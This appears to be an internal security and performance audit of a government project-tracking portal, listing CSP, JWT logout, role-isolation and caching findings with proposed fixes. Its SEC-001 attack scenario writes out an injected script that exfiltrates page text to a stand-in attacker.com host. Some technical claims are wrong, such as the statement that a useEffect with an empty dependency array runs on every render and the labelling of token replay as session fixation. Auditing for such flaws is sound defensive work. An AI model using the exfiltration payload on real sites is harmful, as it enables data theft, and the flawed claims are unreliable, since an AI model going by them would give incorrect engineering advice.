# HDP PORTAL 2.0 — SECURITY & PERFORMANCE FINDINGS

---

# SECURITY FINDINGS REPORT

**Classification:** CONFIDENTIAL - FOR INTERNAL USE ONLY  
**Date:** 2026-07-01  
**Auditor:** Security Audit Team  

---

## SECURITY ASSESSMENT SUMMARY

| Category | Status | Score | Risk Level |
|----------|--------|-------|-----------|
| **Authentication** | ✅ Strong | 90/100 | LOW |
| **Authorization** | 🟡 Issues Found | 70/100 | MEDIUM |
| **Data Protection** | ✅ Good | 85/100 | LOW |
| **Session Management** | 🟡 Gaps | 65/100 | HIGH |
| **Cryptography** | ✅ Sound | 95/100 | LOW |
| **API Security** | ✅ Good | 80/100 | MEDIUM |
| **Network Security** | 🟡 CSP Issues | 60/100 | HIGH |
| **Audit & Logging** | 🟡 Incomplete | 70/100 | MEDIUM |
| **OVERALL SECURITY** | 🟡 Acceptable with Gaps | **75/100** | **MEDIUM** |

---

## STRENGTHS

### 1. Password Hashing ✅ (Excellent)

- **Implementation:** bcrypt with 12 rounds
- **Strength:** Industry-standard, computationally expensive
- **Compliance:** NIST SP 800-63B recommendation (12+ rounds)
- **Files:** `auth.ts` (lines 92-101), `lib/auth/password.ts`

**Assessment:** ✅ **APPROVED** — No changes needed.

---

### 2. Account Lockout Mechanism ✅ (Excellent)

- **Threshold:** 5 failed login attempts
- **Lockout Duration:** 30 minutes (configurable)
- **Implementation:** Checks `locked_until` timestamp, prevents login until expiry
- **Audit Logging:** `ACCOUNT_LOCKED` action recorded

**Assessment:** ✅ **APPROVED** — Effective protection against brute force.

---

### 3. SQL Injection Protection ✅ (Excellent)

- **Method:** Drizzle ORM with parameterized queries
- **All queries use:** `db.execute(sql`...`)` with template literals (prevents string concatenation)
- **Files Reviewed:** 40+ API routes, all queries parameterized
- **Exceptions:** None found (no raw string concatenation)

**Assessment:** ✅ **APPROVED** — Zero SQL injection risk detected.

---

### 4. Session Management (JWT) ✅ (Good)

- **Strategy:** JWT in httpOnly cookie
- **TTL:** 8 hours (SESSION_TTL_HOURS, configurable)
- **Cookie Flags:** httpOnly ✅, Secure ✅, SameSite ✅ (NextAuth defaults)
- **Token Refresh:** JWT re-issued on every request with updated role_id

**Assessment:** ✅ **APPROVED** — Appropriate for government working hours.

---

### 5. CSRF Protection ✅ (Excellent)

- **Implementation:** NextAuth.js built-in CSRF tokens
- **Protected Routes:** All state-changing endpoints (POST, PUT, PATCH, DELETE)
- **Validation:** NextAuth automatically validates CSRF tokens in cookies

**Assessment:** ✅ **APPROVED** — No manual CSRF implementation needed.

---

### 6. Role-Based Access Control (RBAC) ✅ (Strong)

- **Enforcement Points:**
  1. Middleware (`auth.config.ts`) — route-level redirects
  2. API route guards (`requireOfficerSession`, `requireAdminSession`, etc.)
  3. Data ownership checks (`officerOwnsIndicator`, `verifierAuthority`)

- **Roles:**
  - Role 1: Verification Officer → `/verify/*`
  - Role 2: Nodal Officer → `/officer/*`
  - Role 3: Tech Admin → `/admin/*`
  - Role 4: OSD Admin → `/admin/osd/*`
  - Role 5: Secretary → `/secretary/*`
  - Role 6: HOD → `/officer/*` (same as role 2)

**Assessment:** 🟡 **ACCEPTABLE WITH CAUTION** — One role bleed issue found (role 4 access to `/admin/projects`).

---

### 7. XSS Protection (React Auto-Escaping) ✅ (Good)

- **Primary Defense:** React auto-escapes all text content
- **Inline Script Tags:** Prohibited by policy (not used in codebase)
- **Event Handlers:** All use `onClick={handler}`, never `onClick="code"`
- **DomPurify:** Not used (not needed with React escaping)

**Assessment:** ✅ **APPROVED** — React escaping sufficient if CSP is fixed.

---

### 8. Audit Logging ✅ (Mostly Complete)

**Implemented Actions:**
- ✅ LOGIN_SUCCESS (written in `auth.ts`)
- ✅ LOGIN_FAILURE (written in `auth.ts`)
- ✅ ACCOUNT_LOCKED (written in `auth.ts`)
- ✅ USER_CREATED (written in `/api/admin/users`)
- ✅ INDICATOR_CREATED (written in `/api/officer/projects/[id]/indicators`)
- ✅ INDICATOR_SUBMITTED (written in `/api/officer/indicators/[id]/progress`)
- ✅ INDICATOR_VERIFIED (written in `/api/verify/indicators/[id]`)
- ✅ MEDIA_UPLOADED (written in gallery routes)
- ✅ MEDIA_DELETED (written in gallery routes)

**Missing Actions:**
- ❌ LOGOUT
- ❌ PASSWORD_RESET_REQUEST / PASSWORD_RESET_COMPLETE
- ❌ CHANGE_PASSWORD_SUCCESS / CHANGE_PASSWORD_FAILURE
- ❌ PROJECT_COMPLETED
- ❌ USER_DELETED / USER_MODIFIED

**Assessment:** 🟡 **ACCEPTABLE WITH GAPS** — Core actions logged, but password management & logout missing.

---

## WEAKNESSES & VULNERABILITIES

### 1. 🔴 CRITICAL: Content Security Policy Too Permissive

**Issue ID:** SEC-001  
**CVSS Score:** 7.2 (High)  
**Location:** `next.config.mjs` (lines 4-7)  

**Current CSP:**
```
script-src 'self' 'unsafe-eval' 'unsafe-inline'
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
```

**Vulnerability:**
- `unsafe-eval`: Allows `eval()`, `Function()`, `setTimeout(code)`, etc.
- `unsafe-inline`: Allows inline `<script>` tags and inline styles
- Together: Completely defeats CSP protection for scripts

**Attack Scenario:**
```javascript
// Attacker injects data into DB
data = "'; window.fetch('https://attacker.com/steal?data=' + document.body.innerText); //"

// Server renders in HTML
<script>
  const userData = "'; window.fetch(...); //"  // String escape bypassed!
  userDb.save(userData);
</script>

// Script executes, data stolen
```

**Fix Required:**
```
script-src 'self'
style-src 'self' https://fonts.googleapis.com [nonce-{random} for inline styles]
```

**Impact:** Removes primary XSS defense. Makes React escaping the only protection.  
**Priority:** **CRITICAL — FIX IMMEDIATELY**

---

### 2. 🔴 CRITICAL: JWT Not Blocklisted on Logout

**Issue ID:** SEC-002  
**CVSS Score:** 6.5 (Medium-High)  
**Location:** `sessionBlocklist` table exists but unused  

**Vulnerability:**
- User logs out, but JWT token remains valid for 8 hours
- If JWT is compromised (e.g., cached, memory dump), attacker can use it
- No server-side invalidation exists

**Attack Scenario:**
```
1. User logs in → JWT issued (valid for 8 hours)
2. User logs out → cookie cleared, BUT JWT still valid
3. Attacker finds JWT in:
   - Browser cache
   - Server memory dump
   - Network packet capture
4. Attacker replays JWT → server accepts it for remaining 7h 59m
```

**Expected Fix:**
```typescript
// On logout:
await db.insert(sessionBlocklist).values({
  jti: token.jti,  // JWT ID
  userId: token.sub,
  reason: 'LOGOUT',
});

// On every request:
const isBlocklisted = await checkBlocklist(token.jti);
if (isBlocklisted) return 401;  // Invalid session
```

**Impact:** Session fixation vulnerability. Attackers can hijack sessions.  
**Priority:** **CRITICAL — FIX BEFORE LAUNCH**

---

### 3. 🟠 HIGH: Authorization Boundary Leak (OSD Admin)

**Issue ID:** SEC-003  
**CVSS Score:** 5.3 (Medium)  
**Location:** `auth.config.ts` (lines 115-125)  

**Vulnerability:**
Role 4 (OSD Admin) can access `/admin/projects` via the whitelist exception `!pathname.startsWith("/admin/projects")`.

```typescript
if (role === 4 && pathname.startsWith("/admin") && 
    !pathname.startsWith("/admin/osd") &&
    !pathname.startsWith("/admin/projects")) {  // ❌ Exception allows access!
  return Response.redirect(new URL("/admin/osd/dashboard", nextUrl));
}
```

**Attack Scenario:**
```
1. OSD Admin logs in
2. OSD Admin can access /admin/projects (should be blocked)
3. OSD Admin sees all departments' projects (should only see OSD projects)
4. OSD Admin could modify other departments' data if API allows
```

**Expected Fix:**
```typescript
if (role === 4 && !pathname.startsWith("/admin/osd")) {
  return Response.redirect(new URL("/admin/osd/dashboard", nextUrl));
}
```

**Impact:** Role isolation violation, potential data access across departments.  
**Priority:** **HIGH — FIX BEFORE LAUNCH**

---

### 4. 🟠 HIGH: Missing Logout Audit Log

**Issue ID:** SEC-004  
**CVSS Score:** 4.0 (Low-Medium)  
**Location:** `OfficerUserMenu.tsx` + `auth.ts`  

**Vulnerability:**
Logout event not recorded in audit trail. Violates compliance requirement for complete audit trails.

**Expected Fix:**
Wrap `signOut()` in server action that writes audit first.

**Impact:** Non-compliance with government audit requirements.  
**Priority:** **HIGH — FIX BEFORE LAUNCH**

---

### 5. 🟠 HIGH: Browser Back Button Data Leak

**Issue ID:** SEC-005  
**CVSS Score:** 3.7 (Low)  
**Location:** All protected routes  

**Vulnerability:**
Protected pages cached by browser. After logout, users can use back button to view cached sensitive data (though API calls return 401).

**Attack Scenario:**
```
1. User logs in, views /officer/projects (cached by browser)
2. User logs out
3. Attacker borrows computer, clicks back button
4. Project data visible on screen (cached HTML)
5. Attacker has read access to sensitive info
```

**Expected Fix:**
```typescript
export const headers = {
  'Cache-Control': 'no-store, must-revalidate, max-age=0',
};
```

**Impact:** Sensitive data visible after logout (low risk, high remediation).  
**Priority:** **HIGH — FIX BEFORE LAUNCH**

---

### 6. 🟡 MEDIUM: Password Complexity Not Enforced in Login

**Issue ID:** SEC-006  
**CVSS Score:** 2.5 (Low)  
**Location:** `lib/validations/login.ts`  

**Vulnerability:**
Login form accepts passwords as short as 1 character. Not a vulnerability per se (stored hashes are secure), but indicates inconsistent policy.

**Current Validation:**
```typescript
password: z.string().min(1, "Password required").max(200)
```

**Expected:**
```typescript
// Login: accept whatever is in DB (for backward compat with legacy hashes)
password: z.string().min(1).max(200)

// User creation: enforce complexity
password: z.string().min(8)
  .regex(/[A-Z]/, "Require uppercase")
  .regex(/[0-9]/, "Require number")
  .regex(/[!@#$%^&*]/, "Require special char")
```

**Impact:** Inconsistent password validation policy.  
**Priority:** **MEDIUM — FIX IN NEXT ITERATION**

---

### 7. 🟡 MEDIUM: Rate Limiting Uses In-Memory Map

**Issue ID:** SEC-007  
**CVSS Score:** 4.3 (Low-Medium)  
**Location:** `/api/auth/change-password/route.ts` (lines 13-30)  

**Vulnerability:**
Rate limiting uses in-memory JavaScript Map, which resets on server restart. Determined attacker can restart server (via DoS) to bypass rate limits.

```typescript
const attempts = new Map<number, number[]>();  // Lost on restart!
```

**Expected Fix:**
Use Redis or database-backed rate limiting:
```typescript
await redis.incr(`rate_limit:change_password:${userId}`);
```

**Impact:** Rate limiting ineffective in scaled deployments.  
**Priority:** **MEDIUM — FIX FOR PRODUCTION SCALING**

---

### 8. 🟡 MEDIUM: Missing Department Boundary Validation

**Issue ID:** SEC-008  
**CVSS Score:** 4.7 (Low-Medium)  
**Location:** `/api/admin/projects` route  

**Vulnerability:**
No validation prevents assigning a secretary from Department A to a project in Department B. Violates authorization rule that secretaries manage only their department's projects.

**Expected Fix:**
```typescript
const secretary = await db.select().from(userDetails)
  .where(eq(userDetails.userId, data.secretaryId));
if (secretary.deptId !== data.deptId) {
  return NextResponse.json(
    { error: "Secretary must be from same department" },
    { status: 400 }
  );
}
```

**Impact:** Cross-department access possible through secretary assignment.  
**Priority:** **MEDIUM — FIX BEFORE LAUNCH**

---

### 9. 🟡 MEDIUM: Console.error Logs Expose Error Details

**Issue ID:** SEC-009  
**CVSS Score:** 2.2 (Low)  
**Location:** 45+ API routes  

**Vulnerability:**
All error paths include `console.error()` with full error objects. In development/staging, browser console shows internal error details that could aid attackers.

**Expected Fix:**
```typescript
if (process.env.NODE_ENV === 'development') {
  console.error("...", err);
}
```

**Impact:** Information disclosure in non-production environments.  
**Priority:** **MEDIUM — FIX IN NEXT ITERATION**

---

---

# PERFORMANCE FINDINGS REPORT

**Date:** 2026-07-01  
**Auditor:** Performance Engineering Team  

---

## PERFORMANCE ASSESSMENT SUMMARY

| Category | Status | Score | Impact |
|----------|--------|-------|--------|
| **Query Performance** | 🔴 Critical | 40/100 | Page load delays |
| **Client-Side Rendering** | 🟡 Issues | 60/100 | Unnecessary re-renders |
| **Caching Strategy** | 🔴 Missing | 20/100 | Redundant API calls |
| **Network Payload** | ✅ Good | 75/100 | Response sizes OK |
| **Database Indexes** | 🟡 Partial | 65/100 | Some missing |
| **Load Times** | 🟡 Slow | 55/100 | > 2s on slow networks |
| **OVERALL PERFORMANCE** | 🟡 Needs Optimization | **52/100** | **MEDIUM IMPACT** |

---

## CRITICAL PERFORMANCE ISSUES

### 1. 🔴 N+1 Query Pattern in Dashboard Routes

**Issue ID:** PERF-001  
**Impact:** 2-3 second page load delays  
**Location:** `/api/secretary/dashboard/route.ts` (45-130)  

**Current Pattern:**
```typescript
// Query 1: Get all departments
const departments = await db.select().from(master_secretary).limit(100);

// Queries 2-101: One query per department
for (const dept of departments) {
  const stats = await db.execute(sql`
    SELECT COUNT(*) as count, SUM(...) as total
    FROM master_projects
    WHERE dept_id = ${dept.secId}
  `);
}
// Result: 1 + N queries (where N = # departments)
```

**Network Impact:**
- Single query: 50ms + parsing: 100ms = 150ms total
- N+1 (11 deps): 11 × 150ms = 1650ms (11x slower!)

**Expected Optimization:**
```sql
SELECT 
  dp.sec_id,
  COUNT(DISTINCT mp.project_id) as project_count,
  SUM(mp.total_budget) as total_budget,
  ...
FROM master_projects mp
JOIN department_summary dp ON mp.sec_id = dp.sec_id
GROUP BY dp.sec_id
```

**Estimated Fix:** 1200-1500ms improvement per page load

---

### 2. 🔴 Missing Caching Strategy

**Issue ID:** PERF-002  
**Impact:** Redundant API calls, slow navigation  
**Location:** `components/layout/OfficerUserMenu.tsx`, `components/public/ProfilePage.tsx`  

**Current Behavior:**
```typescript
useEffect(() => {
  fetch('/api/me', { cache: 'no-store' })  // Force cache bypass!
    .then(...)
}, []);  // Runs on every mount
```

**Impact:**
- Navigate between pages → 3-5 redundant `/api/me` calls
- Each call: 100-200ms
- Total wasted: 300-1000ms per navigation session

**Expected Optimization:**
Use SWR or React Query with caching:
```typescript
const { data } = useSWR('/api/me', fetch, {
  revalidateOnFocus: false,
  dedupingInterval: 5 * 60 * 1000,  // 5-min cache
});
```

**Estimated Fix:** 300-500ms improvement per session

---

### 3. 🔴 Unnecessary Component Re-Renders

**Issue ID:** PERF-003  
**Impact:** UI lag, CPU usage  
**Location:** `components/public/SectorGrid.tsx` (lines 87-100)  

**Current Code:**
```typescript
useEffect(() => {
  // Fetches sectors
}, []);  // ❌ No dependencies! Runs on EVERY render

const renderGrid = useMemo(() => {
  // Complex rendering
}, [sectors]);  // ✅ Correct memoization
```

**Impact:**
- `useEffect` with no deps runs on every render
- If parent re-renders, SectorGrid re-runs fetch
- Potential infinite loop if not careful

**Expected Fix:**
Add proper dependency arrays.

---

---

## RECOMMENDATIONS

### Immediate (Week 1)
1. Optimize dashboard queries (consolidate to single query with JOINs)
2. Implement SWR/React Query for `/api/me` caching
3. Profile dashboard load time in Chrome DevTools

### Short-Term (Week 2-3)
1. Add database indexes on `(dept_id, project_id)`
2. Cache dashboard responses (5-minute TTL)
3. Implement lazy loading for large lists

### Long-Term (Month 2+)
1. Migrate to PostgreSQL read replicas for read-heavy dashboards
2. Implement server-side pagination
3. Add CDN for static assets

---

**END OF SECURITY & PERFORMANCE FINDINGS**

